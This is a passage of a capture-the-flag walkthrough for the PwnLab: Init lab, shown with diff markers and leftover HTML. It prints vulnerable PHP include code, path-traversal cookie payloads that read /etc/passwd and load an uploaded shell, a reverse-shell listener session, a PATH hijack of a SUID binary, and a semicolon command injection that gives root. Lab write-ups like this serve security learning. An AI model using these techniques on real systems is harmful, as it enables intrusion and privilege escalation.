-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
-</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
-</span><span class='line'><span class="c1">//setcookie(&amp;ldquo;lang&amp;rdquo;,&amp;ldquo;en.lang.php&amp;rdquo;);</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">lang</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span>
-</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="p">}</span>
-</span><span class='line'><span class="c1">// Not implemented yet.</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;html&gt;</span>
-</span><span class='line'><span class="x">&lt;head&gt;</span>
-</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
-</span><span class='line'><span class="x">&lt;/head&gt;</span>
-</span><span class='line'><span class="x">&lt;body&gt;&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;center&gt;</span>
-</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
-</span><span class='line'><span class="x">[ &lt;a href=&quot;http://chousensha.github.io/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
-</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
-</span><span class='line'><span class="cp">&lt;?php</span>
-</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
-</span><span class='line'>    <span class="p">{</span>
-</span><span class='line'>        <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'>    <span class="k">else</span>
-</span><span class='line'>    <span class="p">{</span>
-</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span><span class='line'><span class="x">&lt;/center&gt;</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="x">&lt;p&gt;&lt;/body&gt;</span>
-</span><span class='line'><span class="x">&lt;/html&gt;</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div></p>
-
-<p>That cookie parameter looks vulnerable if we can include a file of our choosing. I tested it by replaying a request in Burp and using the following LFI for the cookie value:</p>
-
-<p><code>
-Cookie: lang=../../../../etc/passwd
-</code></p>
-
-<p>The response came back with the contents of the passwd file, so it worked! I did the same, this time setting the cookie to the path of the previously uploaded shell:</p>
-
-<p><code>
-Cookie: lang=../upload/ff280c52a4fbcbea847ca4a2d69ce6c0.gif
-</code></p>
-
-<p>And in our listener, we have a hit!</p>
-
-<p><code>
-nc -vnlp 8888
-listening on [any] 8888 ...
-connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 36356
-Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
- 11:08:31 up  2:34,  0 users,  load average: 0.00, 0.01, 0.05
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ python -c "import pty;pty.spawn('/bin/sh');"
-</code></p>
-
-<p>I&rsquo;ve proceeded to switch through the 3 users for which I got the passwords earlier and see what can be done. Nothing interesting from kent, getting an authentication failure as mike, but in kane&rsquo;s home folder there&rsquo;s an interesting SUID binary called <em>msgmike</em></p>
-
-<p><code>
--rwsr-sr-x 1 mike mike 5.1K Mar 17  2016 msgmike
-</code></p>
-
-<p>Trying to run it gives an error:</p>
-
-<p><code>
-kane@pwnlab:~$ ./msgmike
-./msgmike
-cat: /home/mike/msg.txt: No such file or directory
-</code></p>
-
-<p>Interesting, this calls cat, but not from an absolute path. So if we create a malicious binary called cat and add kane&rsquo;s home to the PATH variable, we should be able to run an arbitrary program with mike&rsquo;s privileges.</p>
-
-<p><code>
-kane@pwnlab:~$ echo "/bin/bash" &gt; cat
-echo "/bin/bash" &gt; cat
-kane@pwnlab:~$ chmod 777 cat
-chmod 777 cat
-</code></p>
-
-<p>Here we want to run bash as mike. Let&rsquo;s see how the PATH looks:</p>
-
-<p><code>
-kane@pwnlab:~$ echo $PATH
-echo $PATH
-/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-</code></p>
-
-<p>Now let&rsquo;s add the current location to the PATH:</p>
-
-<p><code>
-export PATH=.:$PATH
-kane@pwnlab:~$ echo $PATH
-echo $PATH
-.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:
-</code></p>
-
-<p>Running the binary turns us into mike!</p>
-
-<p><code>
-kane@pwnlab:~$ ./msgmike
-./msgmike
-mike@pwnlab:~$
-</code></p>
-
-<p>In mike&rsquo;s home there is another SUID binary, this time owned by root. We can see where this is going..</p>
-
-<p><code>
--rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
-mike@pwnlab:/home/mike$ ./msg2root
-./msg2root
-Message for root: pwn incoming
-pwn incoming
-pwn incoming
-</code></p>
-
-<p>This binary takes an input and outputs it to the screen, while also appending it to a file in root&rsquo;s home (below line is taken from strings output)</p>
-
-<p><code>
-/bin/echo %s &gt;&gt; /root/messages.txt
-</code></p>
-
-<p>We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:</p>
-
-<p>```
-./msg2root
-./msg2root
-Message for root: hey;/bin/sh
-hey;/bin/sh
-hey</p>
-
-<h1></h1>
-
-<p>```</p>
-
-<p>We&rsquo;re root now! Read the flag and game over:</p>
-
-<p>```</p>
-
-<h1>cat flag.txt</h1>
-
-<p>cat flag.txt
-.&ndash;=~=&ndash;.                                                                 .&ndash;=~=&ndash;.
-(<strong>  <em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(</strong>  <em>)
-(</em> <strong><em>)  </em></strong><strong>                             _                            (<em> </em></strong>)
-(<strong>  _) /  </strong> \                           | |                           (<strong>  _)
-( _ </strong>) | /  \/ <em><strong>  _ </strong>   <strong> _ _ </strong> __ </em>| |<em> </em><strong>                      ( _ </strong>)
-(<strong>  <em>) | |    / _ \| &lsquo;</em> \ / _<code>| '__/ _</code> | </strong>/ <strong>|                     (</strong>  <em>)
-(</em> <strong><em>) | _</em>/\ (<em>) | | | | (</em>| | | | (<em>| | |</em>_<em> \                     (</em> </strong><em>)
-(__  </em>)  _<em><strong>/_</strong>/|</em>| |<em>|_</em>, |<em>|  _</em>,<em>|_</em>|<em><strong>/                     (</strong>  </em>)
-( _ <strong>)                     </strong>/ |                                       ( _ <strong>)
-(</strong>  <em>)                    |</em><strong>/                                        (</strong>  <em>)
-(__  </em>)                                                                 (<strong>  <em>)
-(</em> </strong><em>) If  you are  reading this,  means  that you have  break 'init&rsquo;  (</em> <em><strong>)
-( _ </strong>) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ <strong>)
-(</strong>  </em>) this challenge.                                                 (<strong>  <em>)
-(</em> </strong><em>)                                                                 (</em> <em><strong>)
-( _ </strong>) Please send me  your  feedback or your  writeup,  I will  love  ( _ <strong>)
-(</strong>  </em>) reading it                                                      (<strong>  _)
-(</strong>  <em>)                                                                 (__  </em>)
-(<strong>  _)                                             For sniferl4bs.com  (</strong>  <em>)
-( _ <strong>)                                <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#99;&#x6c;&#x61;&#x6f;&#x72;&#64;&#80;&#119;&#x6e;&#76;&#x61;&#98;&#46;&#110;&#101;&#116;">&#99;&#108;&#x61;&#111;&#114;&#x40;&#x50;&#x77;&#x6e;&#x4c;&#x61;&#98;&#x2e;&#x6e;&#101;&#x74;</a> &ndash; @Chronicoder  ( _ </strong>)
-(__  </em>)                                                                 (<strong>  <em>)
-(</em> </strong><em>)&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;=&ndash;.<em>.&ndash;=&ndash;.</em>.&ndash;(<em> </em><em>_)
-`&ndash;.</em>.&ndash;&lsquo;             <br/>
-```</p>
-
-<p>This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ You&rsquo;re currently going through a   \
-| difficult transition period called |
-\ &ldquo;Life.&rdquo;                            /</p>
 
 <hr />
 
